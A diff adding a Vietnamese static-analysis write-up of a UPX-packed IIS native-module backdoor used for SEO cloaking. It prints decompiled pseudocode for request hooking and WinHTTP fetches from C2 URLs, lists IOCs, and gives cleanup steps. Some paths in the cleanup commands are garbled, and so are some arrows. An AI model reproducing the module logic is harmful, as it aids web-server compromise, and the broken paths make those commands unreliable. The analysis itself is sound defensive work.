@@ -448,5 +448,311 @@ Sau 1 hôi ngồi phân tích tĩnh ta sẽ có map sau:
 <img width="1537" height="995" alt="image" src="https://github.com/user-attachments/assets/44561ac2-a58e-43f1-9897-1eb4838dd2ec" />
 
 
+Sơ đồ luồng tổng quan mà mình đã dựng lại từ quá trình phân tích tĩnh:
 
-Đây là mã giả của nó  
+```text
+                       1.sample
+                          │
+                          ▼
+                    UPX packed
+                          │
+                       upx -d
+                          ▼
+                     1_de.sample
+                          │
+                          ▼
+                    IIS loads DLL
+                          │
+                          ▼
+                    RegisterModule
+                          │
+                          ▼
+                MyHttpModuleFactory
+                          │
+                          ▼
+                    MyHttpModule
+                          │
+                          ▼
+                  HTTP request event
+                          │
+                          ▼
+                  sub_1800031C0
+                          │
+             ┌────────────┼─────────────┐
+             │            │             │
+             ▼            ▼             ▼
+        kiểm tra path   tạo URL      xử lý data
+             │
+      ┌──────┼──────────────┐
+      ▼      ▼              ▼
+   /index  /sitemap     /google...
+  .html/.htm   .xml     verification
+                │
+                ▼
+          HTTP GET ra ngoài
+                │
+        ┌───────┴────────┐
+        ▼                ▼
+ sub_180002800      sub_180002AA0
+ Chrome UA          Googlebot UA
+        │                │
+        └───────┬────────┘
+                ▼
+             WinHTTP
+                │
+     ┌──────────┼──────────┐
+     ▼          ▼          ▼
+ Connect     GET       Receive
+                         │
+                         ▼
+                    ReadData
+                         │
+                         ▼
+                response buffer
+                         │
+                         ▼
+               sub_180002D40
+                         │
+                   split theo \n
+                         │
+                  lọc whitespace
+                         │
+                         ▼
+                  vector<string>
+                         │
+                         ▼
+                  xử lý URL/path
+                         │
+                         ▼
+                tạo HTML / sitemap
+                         │
+                         ▼
+                  HTTP Response
+```
+
+Hoặc nhìn dưới dạng sơ đồ Mermaid chi tiết cho dễ hình dung luồng xử lý:
+
+```mermaid
+flowchart TD
+    A["1.sample (UPX Packed)"] -->|upx -d| B["1_de.sample (Unpacked DLL)"]
+    B -->|IIS w3wp.exe nạp DLL| C["RegisterModule()"]
+    C -->|Khởi tạo| D["MyHttpModuleFactory"]
+    D -->|GetHttpModule()| E["MyHttpModule"]
+    E -->|Bắt sự kiện OnBeginRequest| F["sub_1800031C0"]
+
+    F --> G{"Kiểm tra Request<br/>(URL, User-Agent, Referer)"}
+
+    %% Nhánh 1
+    G -->|URI == /google84d162603ffc785f.html| H["Trả về Token xác minh Google Search Console:<br/>google-site-verification: google84d162603ffc785f.html"]
+
+    %% Nhánh 2
+    G -->|User-Agent chứa 'googlebot'| I{"Kiểm tra đường dẫn"}
+    I -->|/ hoặc /index.html /index.htm| J["sub_180002800 (Chrome UA)<br/>Kéo C2: http://qweb2.com/888/index2.php<br/>Tiêm link SEO rác vào HTML"]
+    I -->|/sitemap.xml| K["sub_180002800 (Chrome UA)<br/>Kéo URL: http://qweb2.com/st/<br/>sub_180002D40: tách \n & trim<br/>Sinh XML Sitemap động"]
+
+    %% Nhánh 3
+    G -->|Referer chứa 'google.com'| L["sub_180002800 (Chrome UA)<br/>Kéo: http://www.massnetworks.org/<br/>Trả nội dung lừa đảo cho nạn nhân"]
+
+    %% Nhánh 4
+    G -->|Người dùng truy cập trực tiếp| M["Bỏ qua - Trả lời bình thường"]
+```
+
+---
+
+### Phân tích chi tiết mã giả & Bản chất kỹ thuật
+
+Đoạn này cực kỳ thú vị và "bánh cuốn" này anh em: sau khi dịch ngược bằng IDA, ta thấy con DLL này không phải là một file thực thi hay trojan bình thường, mà bản chất của nó là một **Native HTTP Module của máy chủ web Microsoft IIS**!
+
+#### 1. Cơ chế đăng ký vào IIS: Hàm `RegisterModule` & `MyHttpModuleFactory`
+
+Mã độc xuất khẩu duy nhất 1 hàm có tên `RegisterModule` (Ordinal 1, địa chỉ `0x180005DA0`). Đây chính là hàm chuẩn mà tiến trình IIS (`w3wp.exe`) sẽ gọi khi nạp một Native Module C++:
+
+```c
+__int64 __fastcall RegisterModule(__int64 a1, __int64 a2)
+{
+  _QWORD *v3;
+
+  v3 = (_QWORD *)sub_1800315E0(8);             // Cấp phát đối tượng MyHttpModuleFactory
+  *v3 = &MyHttpModuleFactory::`vftable';       // Gán vftable tại 0x1800671a0
+  // Gọi pModuleInfo->RegisterGlobalModule(pFactory, 1, 0)
+  return (*(__int64 (__fastcall **)(__int64, _QWORD *, __int64, _QWORD))(*(_QWORD *)a2 + 16LL))(a2, v3, 1, 0);
+}
+```
+
+Tiếp đó, hàm tạo module `MyHttpModuleFactory::GetHttpModule` (tại `0x180005D60`) sẽ khởi tạo lớp `MyHttpModule`:
+
+```c
+__int64 __fastcall sub_180005D60(__int64 a1, _QWORD *a2)
+{
+  _QWORD *v4;
+
+  v4 = (_QWORD *)sub_1800315E0(8);             // Cấp phát đối tượng MyHttpModule
+  *v4 = &MyHttpModule::`vftable';              // Gán vftable tại 0x1800671b0
+  *a2 = v4;
+  return 0;
+}
+```
+
+Lớp `MyHttpModule` kế thừa từ `CHttpModule` của IIS SDK và **ghi đè phương thức đầu tiên trong bảng hàm ảo (vtable slot 0)**, chính là sự kiện **`OnBeginRequest`** (`sub_1800031C0`). Mọi request gửi tới web server IIS đều sẽ bị hàm này chặn lại phân tích trước khi đến tay web application!
+
+---
+
+#### 2. Trọng tâm mã độc: Hàm xử lý sự kiện `sub_1800031C0` (`OnBeginRequest`)
+
+Hàm này dài hơn 2000 dòng mã giả, nhận vào con trỏ `IHttpContext *pHttpContext`. Nó lấy thông tin request thông qua các phương thức của IIS:
+- Lấy `Host` header: `pRequest->GetHeader(28)` (Header ID 28 = `HttpHeaderHost`).
+- Lấy đường dẫn URL: `pRequest->GetRawUrl()` và convert sang Unicode bằng `MultiByteToWideChar`.
+- Lấy `Referer` header: `pRequest->GetHeader(36)` (Header ID 36 = `HttpHeaderReferer`).
+- Lấy `User-Agent` header: `pRequest->GetHeader(40)` (Header ID 40 = `HttpHeaderUserAgent`).
+
+Bắt đầu phân tích từng nhánh rẽ:
+
+##### Nhánh 1: Cướp quyền xác minh Google Search Console
+Mã độc kiểm tra nếu đường dẫn URL là `/google84d162603ffc785f.html` (chiều dài 28 ký tự):
+
+```c
+v32 = L"/google84d162603ffc785f.html";
+if ( v297 == 28 && !wcscmp(lpUrl, L"/google84d162603ffc785f.html") )
+{
+    // Trả về trực tiếp chuỗi token xác minh Google Search Console
+    sub_180008250(&v306, "google-site-verification: google84d162603ffc785f.html");
+    // Chặn request tại đây và hoàn tất phản hồi HTTP về cho Google
+    ...
+}
+```
+$
+ightarrow$ **Ý đồ của tác giả:** Hacker dùng file HTML này để Google tin rằng hacker chính là chủ sở hữu website, từ đó có thể vào Google Search Console để submit sitemap độc hại và theo dõi thứ hạng từ khóa spam!
+
+##### Nhánh 2: Nhận diện bot tìm kiếm (Googlebot Detection)
+Mã độc duyệt qua chuỗi User-Agent, đổi sang chữ thường bằng hàm `sub_180037428` (`tolower`) và so sánh với chuỗi `googlebot` (8 byte: `0x6F62656C676F6F67LL` = "googlebo" + 1 byte `116` = 't'):
+
+```c
+// Kiểm tra User-Agent có chứa "googlebot"
+while ( *(_QWORD *)v38 != 0x6F62656C676F6F67LL || *(_BYTE *)(v38 + 8) != 116 )
+```
+
+Nếu đúng là **Googlebot**:
+1. **Nếu bot truy cập trang chủ (`/`, `/index.html`, `/index.htm`):**
+   - Tạo URL `http://<Host>/` rồi gọi hàm `sub_180002800` (giả lập Chrome UA) để lấy nội dung web gốc.
+   - Tiếp tục gọi `sub_180002800` tải nội dung SEO bẩn từ máy chủ C2 `http://qweb2.com/888/index2.php`.
+   - Ghép thêm liên kết ẩn `<a class="Go_Home" href="/">Go_Home</a><a class="sitemap" href="/sitemap.xml">sitemap</a>` rồi trả dữ liệu đã bị đầu độc này về cho Googlebot lập chỉ mục (index)!
+2. **Nếu bot truy cập sitemap (`/sitemap.xml`):**
+   - Mã độc gọi `sub_180002800` để lấy danh sách URL từ C2: `http://qweb2.com/st/`.
+   - Chuyển buffer nhận được vào hàm `sub_180002D40` để bóc tách từng dòng.
+   - Tự động sinh ra cấu trúc XML sitemap chuẩn (`<urlset> ... <loc> ... </loc> </urlset>`) với Header `Content-Type: text/xml`, gọi `IHttpResponse::WriteEntityChunks` trả trực tiếp cho bot.
+
+##### Nhánh 3: Khai thác người dùng đến từ tìm kiếm Google (Referer `google.com`)
+Mã độc kiểm tra trường Header `Referer` (ID 36):
+
+```c
+// v127 là con trỏ tới chuỗi Header Referer
+if ( !v127 || !sub_1800333E0(v127, "google.com") )
+{
+    // Nếu Referer KHÔNG chứa "google.com" thì tiếp tục các kiểm tra khác
+}
+else
+{
+    // Nếu Referer CHỨA "google.com" (tức người dùng vừa search trên Google và click vào link trang web)
+    v129 = sub_180002800((__int64)v303, L"http://www.massnetworks.org/");
+    // Trả nội dung từ massnetworks.org hoặc chuyển hướng người dùng sang trang lừa đảo!
+}
+```
+
+##### Nhánh 4: Người dùng bình thường gõ URL trực tiếp
+Nếu không phải Googlebot và cũng không có Referer từ `google.com`, mã độc sẽ bỏ qua, trả về `0` cho pipeline IIS xử lý bình thường. Nhờ thế quản trị viên web mở trang lên test vẫn thấy web chạy mượt mà, không hề hay biết máy chủ của mình đã bị cắm backdoor!
+
+---
+
+#### 3. Các hàm bổ trợ mạng & Xử lý chuỗi
+
+##### Hàm `sub_180002800` & `sub_180002AA0`: Kết nối WinHTTP ra ngoài
+Mã độc sử dụng 2 hàm riêng biệt để gửi HTTP GET qua thư viện `WINHTTP.dll`, phân biệt bằng User-Agent:
+- **`sub_180002800` (Giả lập Chrome UA):** Dùng User-Agent `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36` khi tải trang của nạn nhân, tải nội dung từ `http://qweb2.com/888/index2.php`, `http://qweb2.com/st/` và `http://www.massnetworks.org/`.
+- **`sub_180002AA0` (Giả lập Googlebot UA):** Dùng User-Agent `Googlebot/2.1 (+http://www.google.com/bot.html)` khi giao tiếp với `http://qweb2.com` để mạo danh bot vượt qua WAF hoặc đánh lừa hệ thống log:
+
+```c
+__int64 __fastcall sub_180002AA0(__int64 a1, const WCHAR *a2)
+{
+  ...
+  v4 = WinHttpOpen(L"Googlebot/2.1 (+http://www.google.com/bot.html)", 0, nullptr, nullptr, 0);
+  if ( v4 )
+  {
+    WinHttpCrackUrl(a2, 0, 0, &UrlComponents);
+    v5 = WinHttpConnect(v4, (LPCWSTR)UrlComponents.lpszHostName, UrlComponents.nPort, 0);
+    ...
+    v7 = WinHttpOpenRequest(v5, L"GET", (LPCWSTR)UrlComponents.lpszUrlPath, nullptr, nullptr, nullptr, v6);
+    if ( v7 )
+    {
+      if ( WinHttpSendRequest(v7, nullptr, 0, nullptr, 0, 0, 0) && WinHttpReceiveResponse(v8, nullptr) )
+      {
+        // Vòng lặp đọc dữ liệu trả về từ máy chủ
+        do {
+          WinHttpQueryDataAvailable(v8, dwNumberOfBytesAvailable);
+          WinHttpReadData(v8, lpBuffer, dwNumberOfBytesAvailable[0], &dwNumberOfBytesRead);
+          sub_1800075F0(a1, lpBuffer, dwNumberOfBytesRead);
+        } while ( dwNumberOfBytesAvailable[0] );
+      }
+      WinHttpCloseHandle(v8);
+    }
+    WinHttpCloseHandle(v5);
+  }
+  WinHttpCloseHandle(v4);
+  return a1;
+}
+```
+
+##### Hàm `sub_180002D40`: Xử lý mảng Sitemap
+Hàm này nhận chuỗi phản hồi từ `http://qweb2.com/st/`:
+- Dùng `sub_1800581D0` tìm ký tự xuống dòng `
+` (mã ASCII 10).
+- Dùng `sub_180038760` (`isspace`) để lọc bỏ khoảng trắng thừa đầu và cuối mỗi dòng.
+- Đẩy từng dòng URL sạch vào `std::vector<std::string>` phục vụ việc dựng thẻ `<loc>` trong `sitemap.xml`.
+
+---
+
+### Kết luận & Đánh giá Rủi ro
+
+Qua toàn bộ quá trình phân tích tĩnh, ta có thể kết luận chắc chắn:
+1. **Phân loại họ mã độc:** **IIS Native Module Backdoor / Blackhat SEO Poisoning & Cloaking Trojan**.
+2. **Kỹ thuật ngụy trang:** Sử dụng kỹ thuật **Cloaking (ngụy trang tìm kiếm)** cực kỳ tinh vi:
+   - Googlebot thấy một trang web tràn ngập từ khóa spam, link sitemap cờ bạc/lừa đảo.
+   - Người dùng tìm kiếm từ Google bị chuyển hướng sang trang quảng cáo độc hại (`massnetworks.org`).
+   - Quản trị viên và người dùng trực tiếp thấy trang web hoàn toàn bình thường.
+3. **Mục đích của kẻ tấn công:**
+   - Ký sinh vào uy tín (Domain Authority / PageRank) của website bị nhiễm để đẩy thứ hạng từ khóa đen lên top tìm kiếm Google mà không cần xây dựng hệ thống web vệ tinh.
+   - Chiếm đoạt quyền xác minh Google Search Console để kiểm soát việc index URL.
+
+---
+
+### Bảng Chỉ số IOCs Thu thập được
+
+| Loại IOC | Giá trị | Ý nghĩa |
+| :--- | :--- | :--- |
+| **MD5 (Packed)** | `2ac84971b08781272ef591ca02b8d98f` | Mẫu gốc `1.sample` |
+| **SHA-256 (Packed)** | `a5ef58631cc8fa9d39cac9ba9989dc2942ccabe011da2ca098d1f5ec9250c772` | Mẫu gốc `1.sample` |
+| **MD5 (Unpacked)** | `79e4f904db9f6f767ac967d156545fb3` | Mẫu sau khi unpack `1_de.sample` |
+| **SHA-256 (Unpacked)** | `f1e5a8e800d3232873c81527d622536afabc7ae381aeb8a2889296a271380304` | Mẫu sau khi unpack `1_de.sample` |
+| **C2 Domain / URL** | `http://qweb2.com/888/index2.php` | Nguồn tải nội dung SEO spam chèn vào trang chủ |
+| **C2 Domain / URL** | `http://qweb2.com/st/` | Nguồn danh sách link tạo sitemap động |
+| **Redirect URL** | `http://www.massnetworks.org/` | URL chuyển hướng khi người dùng đến từ Google |
+| **Google Verification** | `/google84d162603ffc785f.html` | Đường dẫn file xác thực Search Console |
+| **Verification Token** | `google-site-verification: google84d162603ffc785f.html` | Chuỗi phản hồi xác minh quyền sở hữu web |
+| **Export Function** | `RegisterModule` | Điểm bắt buộc để nạp module vào IIS |
+
+---
+
+### Hướng dẫn Xử lý & Gỡ bỏ trên Máy chủ IIS
+
+1. **Liệt kê và gỡ module độc hại bằng lệnh `appcmd`:**
+   ```cmd
+   %windir%\system32\inetsrvppcmd.exe list config -section:system.webServer/globalModules
+   %windir%\system32\inetsrvppcmd.exe uninstall module /module.name:"<Tên_Module_Khai_Báo>"
+   ```
+2. **Kiểm tra file cấu hình IIS:**
+   - Mở `C:\Windows\System32\inetsrv\configpplicationHost.config`, tìm và xóa các dòng khai báo module trỏ tới file DLL khả nghi trong `<globalModules>` và `<modules>`.
+   - Rà soát file `web.config` ở thư mục web gốc.
+   - Khởi động lại web server: `iisreset`.
+3. **Dọn dẹp trên Google Search Console:**
+   - Đăng nhập Search Console, vào mục Cài đặt $
+ightarrow$ Người dùng và quyền hạn, xóa ngay tài khoản xác minh qua file `google84d162603ffc785f.html`.
+   - Submit lại file `sitemap.xml` chuẩn và yêu cầu Google re-index để xóa các URL rác.
